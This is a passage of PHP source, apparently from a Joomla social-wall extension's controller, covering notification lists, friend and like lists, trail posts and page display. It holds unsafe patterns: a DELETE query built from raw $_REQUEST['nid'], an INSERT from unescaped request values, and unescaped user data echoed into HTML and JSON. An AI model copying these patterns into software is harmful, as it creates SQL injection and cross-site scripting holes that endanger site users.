			$sql = "SELECT * FROM #__awd_wall_notification WHERE ndate >='".date("Y-m-d H:i:s",$currenttime)."' and nuser=".$user->id." and ncreator!=".$user->id;
			$db->setQuery($sql);
			$friends = $db->loadObjectList();
			
			foreach ($friends as $friend)
			{
				$rName =  AwdwallHelperUser::getDisplayName($friend->ncreator);
				$img=AwdwallHelperUser::getBigAvatar51($friend->ncreator);
				if($display_profile_link==1)
				{
					$posterlink= 'index.php?option=com_comprofiler&task=userProfile&user='.$friend->ncreator.'&Itemid='.AwdwallHelperUser::getJsItemId();
				}
				else
				{
					$posterlink= 'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$friend->ncreator.'&Itemid='.AwdwallHelperUser::getComItemId();
				}
				if($friend->ntype=='friend')
				{
					$query = "SELECT status FROM #__awd_connection WHERE connect_from =".$user->id." and connect_to=".$friend->ncreator;
					$db->setQuery($query);
					$status = $db->loadResult();
					
					if($status==0)
					{
						$walllink= 'index.php?option=com_awdwall&view=awdwall&task=friends&Itemid='.AwdwallHelperUser::getComItemId();
						$strnotification=$strnotification.'<div class="nboxmain">
							<div  class="nboximg"><a href="'.$posterlink.'" ><img src="'.$img.'" width="50" height="50" class="awdpostavatar" /></a></div>
							<div class="nboxcontent"><a href="'.$posterlink.'" >'.$rName.'</a><br>&nbsp;'.JText::_("wants to be your") .'<a href="'.$walllink.'" >&nbsp;'.JText::_("friend").' </a></div>
						</div>';
					}
					
					if($status!=0)
					{
						$query = "SELECT status FROM #__awd_connection WHERE connect_from =".$friend->ncreator." and connect_to=".$user->id;
						$db->setQuery($query);
						$astatus = $db->loadResult();
						if($astatus==1) 
						{
						$walllink= 'index.php?option=com_awdwall&view=awdwall&task=friends&Itemid='.AwdwallHelperUser::getComItemId();
						$strnotification=$strnotification.'<div class="nboxmain">
							<div  class="nboximg"><a href="'.$posterlink.'" ><img src="'.$img.'" width="50" height="50" class="awdpostavatar" /></a></div>
							<div class="nboxcontent"><a href="'.$posterlink.'" >'.$rName.'</a><br>&nbsp;'.JText::_("accepted your friend request").'</div>
						</div>';
						}
					}
				
				}
				
			if($friend->ngroupid && $friend->ntype=='group')
			{
				$query = "SELECT title, creator FROM #__awd_groups WHERE id =".$friend->ngroupid;
				$db->setQuery($query);
				$grouptitle = $db->loadObjectList();
				$groupdetail =$grouptitle[0];
				
				$grouptitle=$groupdetail->title;
				$groupcreator=$groupdetail->creator;
				
				if($friend->nwallid)
				{
					$strnotification=$strnotification.'<div class="nboxmain">
						<div  class="nboximg"><a href="'.$posterlink.'" ><img src="'.$img.'" width="50"  height="50" class="awdpostavatar"/></a></div>
						<div class="nboxcontent"><a href="'.$posterlink.'" >'.$rName.'</a><br>'.JText::_('HAS JOINED THE GROUP').' <b>'.$grouptitle.'</b>'.'</div>
					</div>';
				
					
				}
				else
				{
					$tab3='#tabs-3';
					$walllink='index.php?option=com_awdwall&task=groups&Itemid='.$Itemid.$tab3;
					
					$strnotification=$strnotification.'<div class="nboxmain">
						<div  class="nboximg"><a href="'.$posterlink.'" ><img src="'.$img.'" width="50"  height="50" class="awdpostavatar"/></a></div>
						<div class="nboxcontent"><a href="'.$posterlink.'" >'.$rName.'</a><br>'.JText::_('INVITED YOU TO JOIN').
						'<a href="'.$walllink.'" > <b>'.$grouptitle.'</b></a></div>
					</div>';
					
				}
			}
				
				
				
				
			}
			foreach ($items as $item)
			{
				$rName =  AwdwallHelperUser::getDisplayName($item->commenter_id);
				$img=AwdwallHelperUser::getBigAvatar51($item->commenter_id);
				if($display_profile_link==1)
				{
					$posterlink= 'index.php?option=com_comprofiler&task=userProfile&user='.$item->commenter_id.'&Itemid='.AwdwallHelperUser::getJsItemId();
				}
				else
				{
					$posterlink= 'index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$item->commenter_id.'&Itemid='.AwdwallHelperUser::getComItemId();
				}
				$reply=$item->reply;
				$is_pm=$item->is_pm;
				if($reply)
				{
					$walllink= 'index.php?option=com_awdwall&view=awdwall&layout=main&wid='.$item->reply.'&Itemid='.AwdwallHelperUser::getComItemId();
				$strnotification=$strnotification.'<div class="nboxmain">
					<div  class="nboximg"><a href="'.$posterlink.'" ><img src="'.$img.'" width="50"  height="50" class="awdpostavatar"/></a></div>
					<div class="nboxcontent"><a href="'.$posterlink.'" >'.$rName.'</a><br>&nbsp;'.JText::_('posted a comment your').'&nbsp; <a href="'.$walllink.'" > '.JText::_('post').' </a></div>
				</div>';
					
/*					$strnotification=$strnotification.'<div class="successbox" ><a href="'.$posterlink.'" >'.$rName.'</a> posted a comment your <a href="'.$walllink.'" > post </a></div>';
*/				}
				elseif($is_pm)
				{
					$walllink= 'index.php?option=com_awdwall&view=awdwall&layout=main&wid='.$item->is_pm.'&Itemid='.AwdwallHelperUser::getComItemId();
				$strnotification=$strnotification.'<div class="nboxmain">
					<div  class="nboximg"><a href="'.$posterlink.'" ><img src="'.$img.'" width="50" height="50" class="awdpostavatar" /></a></div>
					<div class="nboxcontent"><a href="'.$posterlink.'" >'.$rName.'</a><br>&nbsp;'.JText::_('posted a private message on your').'&nbsp; <a href="'.$walllink.'" > '.JText::_('post').' </a></div>
				</div>';
					
/*					$strnotification=$strnotification.'<div class="successbox" ><a href="'.$posterlink.'" >'.$rName.'</a> posted a private message on your <a href="'.$walllink.'" > post </a></div>';
*/				}
				else
				{
				 if($item->type!='group')
				 {
					$strnotification=$strnotification.'<div class="nboxmain">
						<div  class="nboximg"><a href="'.$posterlink.'" ><img src="'.$img.'" width="50"  height="50" class="awdpostavatar"/></a></div>
						<div class="nboxcontent"><a href="'.$posterlink.'" >'.$rName.'</a><br>&nbsp;'.JText::_('posted a message on your').' <a href="'.$mywallink.'" > '.JText::_('wall').' </a></div>
					</div>';
				}
					
				}
			}
		}
		}
			if(empty($strnotification))
			{
				$strnotification=0;
			}
		echo $strnotification;
		exit;
	}
	
	function gettotalnotification()
	{
		$config 		= &JComponentHelper::getParams('com_awdwall');
		$template 		= $config->get('temp', 'default');
	if($template!='default')
	{
	
	
	
		header("Pragma: no-cache"); 
		global $mainframe;
		$db =& JFactory::getDBO();
		$user = &JFactory::getUser();
		$Itemid = AwdwallHelperUser::getComItemId();
		$config 		= &JComponentHelper::getParams('com_awdwall');
		$display_profile_link = $config->get('display_profile_link', 1);
		$jomalbumexist=0;
		$wallalbumfile = JPATH_SITE .DS. 'components'.DS.'com_awdjomalbum'.DS.'awdjomalbum.php';
		$jomalbumexist='0';
		if (file_exists($wallalbumfile)) 
		{
			$jomalbumexist=1;
		}
		$db =& JFactory::getDBO();
		$query = "SELECT * FROM #__awd_wall_notification WHERE 	nuser =".$user->id." and ncreator !=".$user->id." order by nid desc";
		$db->setQuery($query);
		$rows = $db->loadObjectList();
		$data=1;
		$num=date("Y-m-d H:i:s");
		$n=count($rows);
		if($data==1)
		{
		for($i=0;$i<$n;$i++)
		{
			if($i==$n-1)
			{
				$class='notiItemsWrap';
			}
			else
			{
				$class='notiItemsWrap';
			}
			$cusername=AwdwallHelperUser::getDisplayName($rows[$i]->ncreator);
			if($display_profile_link==1)
			{
				$cuserlink= 'index.php?option=com_comprofiler&task=userProfile&user='.$rows[$i]->ncreator.'&Itemid='.AwdwallHelperUser::getJsItemId();
			}
			else
			{
				$cuserlink='index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$rows[$i]->ncreator.'&Itemid='.$Itemid;
			}
			
			$cuserimage=AwdwallHelperUser::getBigAvatar32($rows[$i]->ncreator);			
			$notifytext='';
			$notifyurl='';
			$query='';
			if($rows[$i]->ntype=='text' || $rows[$i]->ntype=='image' || $rows[$i]->ntype=='video' || $rows[$i]->ntype=='link' || $rows[$i]->ntype=='mp3' || $rows[$i]->ntype=='file' || $rows[$i]->ntype=='trail' || $rows[$i]->ntype=='jing' || $rows[$i]->ntype=='event' || $rows[$i]->ntype=='article')
			{
				if($rows[$i]->nalbumid)
				{
					$notifytext=JText::_('commented on your photo');
					$notifyurl='index.php?option=com_awdjomalbum&view=awdimagelist&albumid='.$rows[$i]->nalbumid.'&pid='.$rows[$i]->nphotoid.'&Itemid='.$Itemid;
					$type='tag';
				}
				if($rows[$i]->nwallid)
				{
					$query="select reply from #__awd_wall where id=".$rows[$i]->nwallid;
					$db->setQuery($query);
					$reply = $db->loadResult();
					if($reply==0)
					{
						$notifytext=JText::_('posted on your wall');
						$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wid='.$rows[$i]->nwallid.'&Itemid='.$Itemid;
					}
					else
					{
						if($rows[$i]->nphotoid)
						{
							$notifytext=JText::_('commented on your photo');
							if($jomalbumexist==1)
							{
								$notifyurl='index.php?option=com_awdjomalbum&view=awdwallimagelist&wuid='.$rows[$i]->nuser.'&pid='.$rows[$i]->nphotoid.'&Itemid='.$Itemid;
								$type='tag';
								
							}
							else
							{
								$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wid='.$rows[$i]->nwallid.'&Itemid='.$Itemid;
								$type='text';
							}
						}
						else
						{
							$notifytext=JText::_('POSTED ON YOUR POST');
							$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wid='.$reply.'&Itemid='.$Itemid;
						}
					}
				}
			}
			if($rows[$i]->ntype=='group')
			{
				$query = "SELECT title, creator FROM #__awd_groups WHERE id =".$rows[$i]->ngroupid;
				$db->setQuery($query);
				$grouptitle = $db->loadObjectList();
				$groupdetail =$grouptitle[0];
				
				$grouptitle=$groupdetail->title;
				$groupcreator=$groupdetail->creator;
				if($rows[$i]->nwallid)
				{
					$notifytext=JText::_('HAS JOINED THE GROUP').' <b>'.$grouptitle.'</b>';
					$notifyurl ='index.php?option=com_awdwall&task=viewgroup&groupid=' . $rows[$i]->ngroupid.'&Itemid=' . $Itemid;
					//$notifyurl='index.php?option=com_awdwall&layout=mywall&wuid='.$rows[$i]->ncreator.'&Itemid='.$Itemid;
				}
				else
				{
					$notifytext=JText::_('INVITED YOU TO JOIN').' <b>'.$grouptitle.'</b>';
					$tab3='#tabs-3';
					$notifyurl='index.php?option=com_awdwall&task=groups&Itemid='.$Itemid;
				}
			}
			if($rows[$i]->ntype=='pm')
			{
				$notifytext=JText::_('ADDED PRIVATE MESSAGE ON YOUR WALL');
				$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wid='.$rows[$i]->nwallid.'&Itemid='.$Itemid;
			}
			if($rows[$i]->ntype=='friend')
			{
				$query = "SELECT status FROM #__awd_connection WHERE connect_from =".$user->id." and connect_to=".$rows[$i]->ncreator;
				$db->setQuery($query);
				$status = $db->loadResult();
				
				if($status==0)
				{
					$notifytext=JText::_('WANTS TO BE YOUR FRIEND');
					$notifyurl='index.php?option=com_awdwall&task=friends&Itemid='.$Itemid;
				}
				if($status!=0)
				{
					$query = "SELECT status FROM #__awd_connection WHERE connect_from =".$rows[$i]->ncreator." and connect_to=".$user->id;
					$db->setQuery($query);
					$astatus = $db->loadResult();
					if($astatus==1) {
						$notifytext=JText::_('ACCEPTED YOUR FRIEND REQUEST');
						//$notifyurl='index.php?option=com_awdwall&layout=mywall&wuid='.$rows[$i]->ncreator.'&Itemid='.$Itemid;
						$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$rows[$i]->ncreator.'&Itemid='.$Itemid;
					}
				}
			}
			if($rows[$i]->ntype=='tag')
			{
				if($rows[$i]->nalbumid==0)
				{
					$query = "SELECT a.user_id as user_id, b.wall_id as wall_id FROM #__awd_wall as a left join #__awd_wall_images as b on a.id=b.wall_id WHERE b.id =".$rows[$i]->nphotoid;
					$db->setQuery($query);
					$wallphoto = $db->loadObjectList();
					if($wallphoto[0]->user_id==$rows[$i]->ncreator)
						$notifytext=JText::_("TAGGED YOU IN HIS PHOTO");
					else if($wallphoto[0]->user_id==$rows[$i]->nuser)
						$notifytext=JText::_("TAGGED YOU IN YOUR PHOTO");
					else 					
						//$notifytext=JText::_("tagged you in ").AwdwallHelperUser::getDisplayName($wallphoto[0]->user_id).JText::_(" 's photo.");
						$notifytext=JText::sprintf('tagged you in users photo', AwdwallHelperUser::getDisplayName($wallphoto[0]->user_id));
					$notifyurl='index.php?option=com_awdjomalbum&view=awdwallimagelist&wuid='.$wallphoto[0]->user_id.'&pid='.$rows[$i]->nphotoid.'&Itemid='.$Itemid;
				}
				else
				{
					$query = "SELECT userid FROM #__awd_jomalbum_photos  WHERE id =".$rows[$i]->nphotoid." and albumid=".$rows[$i]->nalbumid;
					$db->setQuery($query);
					$albumuserid = $db->loadResult();
					//$notifytext=JText::_("tagged you in ").AwdwallHelperUser::getDisplayName($albumuserid).JText::_(" 's photo.");
						$notifytext=JText::sprintf('tagged you in users photo', AwdwallHelperUser::getDisplayName($albumuserid));
					$notifyurl='index.php?option=com_awdjomalbum&view=awdimagelist&albumid='.$rows[$i]->nalbumid.'&pid='.$rows[$i]->nphotoid.'&Itemid='.$Itemid;
				}
			}
			
		$config 	= &JComponentHelper::getParams('com_awdwall');
		$timestamp_format 	= $config->get('timestamp_format', '0');
			if($type=='')
			$type=$rows[$i]->ntype;
			
			$notifyurl=JRoute::_($notifyurl,false);
			
		?>
      <div class="<?php echo $class;?>" id="awdnoticeDiv<?php echo $rows[$i]->nid;?>" onclick="navigateurl('<?php echo $rows[$i]->nid;?>','<?php echo $notifyurl;?>','<?php echo $type;?>')">
        <div  class="notiItem itemThumb30px underline"><a href="<?php echo $cuserlink;?>" class="thumbWrap"><img src="<?php echo $cuserimage;?>" alt="<?php echo $cusername;?>" title="<?php echo $cusername;?>" height="32" width="32" class="awdpostavatar" ></a>
          <div class="txtWrap"><span style="line-height:normal !important;"><a href="<?php echo $cuserlink;?>" class="userlink" alt="<?php echo $cusername;?>" title="<?php echo $cusername;?>"><?php echo $cusername;?> </a> <?php echo $notifytext;?> <br /><?php 
		if($timestamp_format==1)
		{
			$timestamp=strtotime($rows[$i]->ndate);
			echo AwdwallHelperUser::getDisplayTime($timestamp);
		}
		else
		{
		  	echo awdwallController::getTextDate($rows[$i]->ndate);
		}?>
		  </span>
          </div>
		  
        </div>
      </div>
	  <?php 
	  } 
	  ?>
		<?php
		}
		else
		{
		?>
		  <div class="notiItemsWrap">
			<div class="txtWrap"><center><?php echo JText::_('No new Notice');?></center></div>
		  </div>
		<?php
		}
		exit;
	
	}
	else
	{
	
	
	
		header("Pragma: no-cache"); 
		$mainframe= JFactory::getApplication(); 
		$db =& JFactory::getDBO();
		$user = &JFactory::getUser();
		$Itemid = AwdwallHelperUser::getComItemId();
		$config 		= &JComponentHelper::getParams('com_awdwall');
		$jomalbumexist=0;
		$wallalbumfile = JPATH_SITE .DS. 'components'.DS.'com_awdjomalbum'.DS.'awdjomalbum.php';
		$jomalbumexist='0';
		if (file_exists($wallalbumfile)) 
		{
			$jomalbumexist=1;
		}
		
		$db =& JFactory::getDBO();
		$query = "SELECT * FROM #__awd_wall_notification WHERE 	nuser =".$user->id." and ncreator !=".$user->id." order by nid desc";
		$db->setQuery($query);
		$rows = $db->loadObjectList();
		$data=1;
		$num=date("Y-m-d H:i:s");
		?>
			<nav>
                <ul>
         <?php
		$n=count($rows);
		if($n>0)
		{
		for($i=0;$i<$n;$i++)
		{
			if($i==$n-1)
			{
				$class='notiItemsWrap';
			}
			else
			{
				$class='notiItemsWrap';
			}

			$cusername=AwdwallHelperUser::getDisplayName($rows[$i]->ncreator);
			$cuserlink='index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$rows[$i]->ncreator.'&Itemid='.$Itemid;


			
			$cuserimage=AwdwallHelperUser::getBigAvatar32($rows[$i]->ncreator);
						
			$notifytext='';
			$notifyurl='';
			$query='';
			if($rows[$i]->ntype=='text' || $rows[$i]->ntype=='image' || $rows[$i]->ntype=='video' || $rows[$i]->ntype=='link' || $rows[$i]->ntype=='mp3' || $rows[$i]->ntype=='file' || $rows[$i]->ntype=='trail' || $rows[$i]->ntype=='jing' || $rows[$i]->ntype=='event' || $rows[$i]->ntype=='article')
			{
				if($rows[$i]->nalbumid)
				{
					$notifytext=JText::_('commented on your photo');
					$notifyurl='index.php?option=com_awdjomalbum&view=awdimagelist&albumid='.$rows[$i]->nalbumid.'&pid='.$rows[$i]->nphotoid.'&Itemid='.$Itemid;
					$type='tag';
				}
				if($rows[$i]->nwallid)
				{
					$query="select reply from #__awd_wall where id=".$rows[$i]->nwallid;
					$db->setQuery($query);
					$reply = $db->loadResult();
					if($reply==0)
					{
						$notifytext=JText::_('posted on your wall');
						$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wid='.$rows[$i]->nwallid.'&Itemid='.$Itemid;
					}
					else
					{
						if($rows[$i]->nphotoid)
						{
							$notifytext=JText::_('commented on your photo');
							if($jomalbumexist==1)
							{
								$notifyurl='index.php?option=com_awdjomalbum&view=awdwallimagelist&wuid='.$rows[$i]->nuser.'&pid='.$rows[$i]->nphotoid.'&Itemid='.$Itemid;
								$type='tag';
								
							}
							else
							{
								$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wid='.$rows[$i]->nwallid.'&Itemid='.$Itemid;
								$type='text';
							}
						}
						else
						{
							$notifytext=JText::_('POSTED ON YOUR POST');
							$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wid='.$reply.'&Itemid='.$Itemid;
						}
					}
				}

			}
			if($rows[$i]->ntype=='group')
			{
				$query = "SELECT title, creator FROM #__awd_groups WHERE id =".$rows[$i]->ngroupid;
				$db->setQuery($query);
				$grouptitle = $db->loadObjectList();
				$groupdetail =$grouptitle[0];
				
				$grouptitle=$groupdetail->title;
				$groupcreator=$groupdetail->creator;
				if($rows[$i]->nwallid)
				{
					$notifytext=JText::_('HAS JOINED THE GROUP').' <b>'.$grouptitle.'</b>';
					$notifyurl ='index.php?option=com_awdwall&task=viewgroup&groupid=' . $rows[$i]->ngroupid.'&Itemid=' . $Itemid;
					//$notifyurl='index.php?option=com_awdwall&layout=mywall&wuid='.$rows[$i]->ncreator.'&Itemid='.$Itemid;
				}
				else
				{
					$notifytext=JText::_('INVITED YOU TO JOIN').' <b>'.$grouptitle.'</b>';
					$tab3='#tabs-3';
					$notifyurl='index.php?option=com_awdwall&task=groups&Itemid='.$Itemid;
				}
			}
			if($rows[$i]->ntype=='pm')
			{
				$notifytext=JText::_('ADDED PRIVATE MESSAGE ON YOUR WALL');
				$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wid='.$rows[$i]->nwallid.'&Itemid='.$Itemid;
			}
			if($rows[$i]->ntype=='friend')
			{
				$query = "SELECT status FROM #__awd_connection WHERE connect_from =".$user->id." and connect_to=".$rows[$i]->ncreator;
				$db->setQuery($query);
				$status = $db->loadResult();
				
				if($status==0)
				{
					$notifytext=JText::_('WANTS TO BE YOUR FRIEND');
					$notifyurl='index.php?option=com_awdwall&task=friends&Itemid='.$Itemid;
				}
				if($status!=0)
				{
					$query = "SELECT status FROM #__awd_connection WHERE connect_from =".$rows[$i]->ncreator." and connect_to=".$user->id;
					$db->setQuery($query);
					$astatus = $db->loadResult();
					if($astatus==1) {
						$notifytext=JText::_('ACCEPTED YOUR FRIEND REQUEST');
						//$notifyurl='index.php?option=com_awdwall&layout=mywall&wuid='.$rows[$i]->ncreator.'&Itemid='.$Itemid;
						$notifyurl='index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$rows[$i]->ncreator.'&Itemid='.$Itemid;
					}
				}
			}
			if($rows[$i]->ntype=='tag')
			{
				if($rows[$i]->nalbumid==0)
				{
					$query = "SELECT a.user_id as user_id, b.wall_id as wall_id FROM #__awd_wall as a left join #__awd_wall_images as b on a.id=b.wall_id WHERE b.id =".$rows[$i]->nphotoid;
					$db->setQuery($query);
					$wallphoto = $db->loadObjectList();
					if($wallphoto[0]->user_id==$rows[$i]->ncreator)
						$notifytext=JText::_("TAGGED YOU IN HIS PHOTO");
					else if($wallphoto[0]->user_id==$rows[$i]->nuser)
						$notifytext=JText::_("TAGGED YOU IN YOUR PHOTO");
					else 					
						//$notifytext=JText::_("tagged you in ").AwdwallHelperUser::getDisplayName($wallphoto[0]->user_id).JText::_(" 's photo.");
						$notifytext=JText::sprintf('tagged you in users photo', AwdwallHelperUser::getDisplayName($wallphoto[0]->user_id));
					$notifyurl='index.php?option=com_awdjomalbum&view=awdwallimagelist&wuid='.$wallphoto[0]->user_id.'&pid='.$rows[$i]->nphotoid.'&Itemid='.$Itemid;
				}
				else
				{
					$query = "SELECT userid FROM #__awd_jomalbum_photos  WHERE id =".$rows[$i]->nphotoid." and albumid=".$rows[$i]->nalbumid;
					$db->setQuery($query);
					$albumuserid = $db->loadResult();
					//$notifytext=JText::_("tagged you in ").AwdwallHelperUser::getDisplayName($albumuserid).JText::_(" 's photo.");
						$notifytext=JText::sprintf('tagged you in users photo', AwdwallHelperUser::getDisplayName($albumuserid));
					$notifyurl='index.php?option=com_awdjomalbum&view=awdimagelist&albumid='.$rows[$i]->nalbumid.'&pid='.$rows[$i]->nphotoid.'&Itemid='.$Itemid;
				}
			}
			
		$config 	= &JComponentHelper::getParams('com_awdwall');
		$timestamp_format 	= $config->get('timestamp_format', '0');
			if($type=='')
			$type=$rows[$i]->ntype;
			
			$notifyurl=JRoute::_($notifyurl,false);

		?>
        <li class="new"><a href="javascript:void(0)" onclick="navigateurl('<?php echo $rows[$i]->nid;?>','<?php echo $notifyurl;?>','<?php echo $type;?>')" ><span class="avatar"><img src="<?php echo $cuserimage;?>" alt="<?php echo $cusername;?>" title="<?php echo $cusername;?>" height="32" width="32" /></span><?php echo $cusername;?>&nbsp;<?php echo $notifytext;?><br /> <?php 
		if($timestamp_format==1)
		{
			$timestamp=strtotime($rows[$i]->ndate);
			echo AwdwallHelperUser::getDisplayTime($timestamp);
		}
		else
		{
		  	echo awdwallController::getTextDate($rows[$i]->ndate);
		}
		?>
</a></li>
      
	  <?php 
	  } 
	  ?>
		<?php
		}
		else
		{
		?>
        <li><a ><?php echo JText::_("No new Notice");?></a></li>
		  
		<?php
		}
		?>
		   </ul>
          </nav>
         
          <script type="text/javascript">
		  <?php if($n>0){?>
          jQuery(".message-count").html("<?php echo $n;?>");
		  jQuery(".message-count").show();
		  <?php }else{?>
		   jQuery(".message-count").hide();
		  <?php } ?>
          </script>
		<?php
		exit;
	
	
	}
	
	
	}
	
	
	function getTextDate($timestamp)
	{
		  $unix_time = strtotime($timestamp);
		  if(is_numeric($unix_time))
		  {
			  // $read_in = date("F j, Y, g:i a", $unix_time);
			   $read_in = date("g:i A l, j-M-y", $unix_time);
			   return $read_in;
		  }
	}	
	
	
	
	function delnotification()
	{
		$mainframe= JFactory::getApplication();
		$db =& JFactory::getDBO();
		$query = "DELETE FROM #__awd_wall_notification WHERE nid=".$_REQUEST['nid'];
		$db->setQuery($query);
		$db->query();
	//	echo $query;
		exit;
	}
	function getCommentlikeList()
	{
		
		$db =& JFactory::getDBO();
		$itemId = AwdwallHelperUser::getComItemId();
		$user = &JFactory::getUser();
		$wid=$_REQUEST['wid'];
		//$query 	= "SELECT * FROM #__awd_wall_comment_like where wall_id = " . (int)$wid." and user_id!=".$user->id;
		$query 	= "SELECT * FROM #__awd_wall_comment_like where wall_id = " . (int)$wid;
		$db->setQuery($query);
		$frndrows = $db->loadObjectList();
	
		if(count($frndrows))
	
		{
	
		foreach($frndrows as $frndrow)
	
		{
	
		//$avatar=AwdwallHelperUser::getAvatar($frndrow->connect_from);
		$avatar=AwdwallHelperUser::getBigAvatar51($frndrow->user_id);
		$commentuser =& JFactory::getUser($frndrow->user_id);
	
		$profilelink='index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$frndrow->connect_from.'&Itemid='.$itemId;
	
		$message=$message.'<div class=\'awdthumb\'><a href=\''.$profilelink.'\' title=\''.$commentuser->username.'\' alt=\''.$commentuser->username.'\'><img src=\''.$avatar.'\'  border=\'0\' title=\''.$commentuser->username.'\' alt=\''.$commentuser->username.'\' height=\'50\' width=\'50\' class=\'awdpostavatar\' /><br><center id=\'awdusername\' >'.$commentuser->username.'</center></a></div>';
		
//		$message=$message.'<img src="'.JURI::base().'components/com_awdwall/libraries/phpthumb.php?src='.AwdwallHelperUser::getBigAvatar($membercreator->creator).'&w=30&h=30" alt="'.AwdwallHelperUser::getDisplayName($membercreator->creator).'" border="0" style="float:left"/>';
				
		//$message=$message.'<br><center id=\'awdusername\' >'.$commentuser->username.'</center></a></div>';
	
		}
		
	$return_json = '{"message":"' . $message . '"}';
	echo $return_json;
		exit;
	
		}else
		{
			$message=JText::_('You like it');
			echo  '{"message":"' . $message . '"}';
			exit;
		}
	
	}	
	
	function seetotalfriends()
	{
		
		$db =& JFactory::getDBO();
		$itemId = AwdwallHelperUser::getComItemId();
		
		$id=$_REQUEST['id'];
		$query 	= "SELECT connect_from FROM #__awd_connection where connect_to = " . (int)$id." and status='1' and pending='0'";
		$db->setQuery($query);
		$frndrows = $db->loadObjectList();
	
		if(count($frndrows))
	
		{
	
		foreach($frndrows as $frndrow)
	
		{
	
		$avatar=AwdwallHelperUser::getBigAvatar51($frndrow->connect_from);
		$commentuser =& JFactory::getUser($frndrow->connect_from);
	
		$profilelink=JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&wuid='.$frndrow->connect_from.'&Itemid='.$itemId, false);
	
		$message=$message.'<div class=\'awdthumb\'><a href=\''.$profilelink.'\' title=\''.$commentuser->username.'\' alt=\''.$commentuser->username.'\'><img src=\''.$avatar.'\'  border=\'0\' title=\''.$commentuser->username.'\' alt=\''.$commentuser->username.'\' class=\'awdpostavatar\' /><br><center id=\'awdusername\' >'.$commentuser->username.'</center></a></div>';
		
//		$message=$message.'<img src="'.JURI::base().'components/com_awdwall/libraries/phpthumb.php?src='.AwdwallHelperUser::getBigAvatar($membercreator->creator).'&w=30&h=30" alt="'.AwdwallHelperUser::getDisplayName($membercreator->creator).'" border="0" style="float:left"/>';
				
		//$message=$message.'<br><center id=\'awdusername\' >'.$commentuser->username.'</center></a></div>';
	
		}
		
	$return_json = '{"message":"' . $message . '"}';
	echo $return_json;
		exit;
	
		}
	
	}	
	
	
function addtrail()
{       
	$user = &JFactory::getUser();
	$wuid = JRequest::getInt('wuid', 0);
	if($wuid == 0) $wuid = $user->id;
	$groupId = JRequest::getInt('groupid', NULL);
	$itemId = AwdwallHelperUser::getComItemId();
	$db =& JFactory::getDBO();
	if((int)$user->id){
	require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');	
	$awd_trail_title=JRequest::getVar('awd_trail_title', '');							
	$awd_trail_link= JRequest::getVar('awd_trail_link', '');
	if($awd_trail_title != ''){
		// save into wall table first
		$wall = &JTable::getInstance('Wall', 'Table');
		$wall->user_id 		= $wuid;					
		$wall->type			= 'trail';
		$wall->commenter_id	= $user->id;
		$wall->user_name	= '';
		$wall->avatar		= '';
		$wall->message		= '';
		$wall->reply		= 0;
		$wall->is_read		= 0;
		$wall->is_pm		= 0;
		$wall->is_reply		= 0;
		$wall->posted_id	= NULL;
		$wall->wall_date	= NULL;
			   // store wall to database
			if (!$wall->store()){				
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid=' . $itemId , false ), JText::_('Post Failed'));	
				}
			$wallId = $wall->id;				
			$sql = 'INSERT INTO #__awd_wall_trail(wall_id, trail_title,trail_link) VALUES("'.$wallId .'","' . $awd_trail_title . '", "' . $awd_trail_link . '")';
				$db->setQuery($sql);
				$db->query();
			}
			echo '{"wid_tmp": "' . $wallId .  '"}';
		}
		exit;
	}
		
	function display($cachable = false) 
	{ 
		jimport( 'joomla.access.access' );
		$db =& JFactory::getDBO();
		$Itemid = AwdwallHelperUser::getComItemId();
		$user 	= &JFactory::getUser();
		$day  = date('d');
		$month  = date('m');
		$year  = date('Y');
		
		$config 		= &JComponentHelper::getParams('com_awdwall');
		$accessusergroup = $config->get('usergroup', '');		
		$agroups = JAccess::getGroupsByUser($user->id, false);
		
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');		
		
		$Itemid = AwdwallHelperUser::getComItemId();
		
		
		//Delete birthday reminders
		$db =& JFactory::getDBO();
		$today=date("Y").'-'.date("m").'-'.date("d");
		$sql = 'DELETE FROM #__awd_wall_bdayreminder WHERE read_date<"'.$today.'"';
		$db->setQuery($sql);
		$db->query();
		
		// assign model to view
		$wallModel = $this->getModel('wall');		
		$layout = JRequest::getCmd('layout', '');	
		if($layout=='cbmywall')
		{
			$doc = &JFactory::getDocument();
			$docRaw = &JDocument::getInstance('raw');
			$doc = $docRaw;
		}
		
		$user 	= &JFactory::getUser();
		$user 	= &JFactory::getUser();
		$app = JFactory::getApplication('site');
		$config =  & $app->getParams('com_awdwall');
		$access_level = $config->get('access_level', 1);
		$display_jomwalllogin = $config->get('display_jomwalllogin', 0);
		
		
			if($access_level == 1 && empty($user->id)){
				$mainlink=base64_encode(JRoute::_("index.php?option=com_awdwall&view=awdwall&layout=".$layout."&Itemid=".$Itemid,false));
				if($display_jomwalllogin==1)
				{ 
					$login=JRoute::_("index.php?option=com_awdwall&task=login&Itemid=".$Itemid,false);
				}
				else
				{
					$login=JRoute::_("index.php?option=com_users&view=login&Itemid=".$Itemid."&return=".$mainlink,false);
				}
				$this->setRedirect($login);
			//	echo 'her';
			}
		
		if(!empty($accessusergroup))
		{
			$commonElements = array_intersect($agroups,$accessusergroup);
			$comcount=count($commonElements);
		
			if($comcount==0)
			{
				$this->setMessage(JText::_('ACCESS GROUP MESSAGE'));
				$mainlink=base64_encode(JRoute::_("index.php?option=com_awdwall&view=awdwall&layout=".$layout."&Itemid=".$Itemid,false)); 
				if($display_jomwalllogin==1)
				{ 
					$login=JRoute::_("index.php?option=com_awdwall&task=login&Itemid=".$Itemid,false);
				}
				else
				{
